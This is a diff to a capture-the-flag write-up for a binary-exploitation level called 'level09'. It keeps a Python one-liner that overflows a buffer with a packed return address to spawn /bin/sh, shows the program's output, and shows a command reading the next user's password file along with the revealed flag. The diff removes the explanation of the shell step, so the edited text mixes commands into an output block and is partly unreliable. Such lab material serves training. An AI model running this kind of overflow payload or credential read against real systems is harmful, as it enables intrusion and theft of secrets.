@@ -160,11 +160,6 @@ We need to send **three inputs** to the program:
 (python -c 'import struct; print "A"*40 + "\xff"; print "B"*200 + struct.pack("<Q", 0x55555555488c); print "/bin/sh"'; cat) | ./level09
 ```
 
-**Why `cat` at the end?**
-- Keeps stdin open after the Python script finishes
-- Allows us to interact with the shell we spawned
-- Without it, the shell would immediately close
-
 **Expected output:**
 ```
 --------------------------------------------
@@ -173,27 +168,7 @@ We need to send **three inputs** to the program:
 >: Enter your username
 >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
 >>: >: Msg sent!
-```
-
-**At this point, the program appears to hang, but you have a shell!**
-
-Type commands:
-```bash
-whoami
-```
-
-**Output:**
-```
-end
-```
-
-**Read the final flag:**
-```bash
 cat /home/users/end/.pass
-```
-
-**Output:**
-```
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 ```
 
